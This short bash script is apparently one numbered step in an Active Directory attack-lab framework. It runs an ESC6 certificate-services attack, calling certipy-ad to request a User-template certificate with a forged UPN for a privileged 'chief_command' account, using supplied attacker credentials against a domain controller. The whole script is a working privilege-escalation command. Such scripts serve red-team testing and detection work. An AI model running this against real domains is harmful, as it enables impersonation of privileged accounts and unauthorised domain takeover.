#!/bin/bash
# CONFIGURED—ESC6 EDITF_ATTRIBUTESUBJECTALTNAME2 enabled
source "$(dirname "$0")/../lib/cadre-env.sh"
source "$(dirname "$0")/../lib/common.sh"

start_attack "054" "ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 abuse"

require_tool certipy-ad

log "Requesting certificate with SAN override on User template (CA trusts SAN)"
run_cmd "certipy-ad req -ca $CA_NAME -template User -upn chief_command@$DOMAIN_ROOT -u $ATTACK_USER@$DOMAIN_ROOT -p '$ATTACK_PASS' -dc-ip $DC01"
result $? "ESC6 — certificate request"
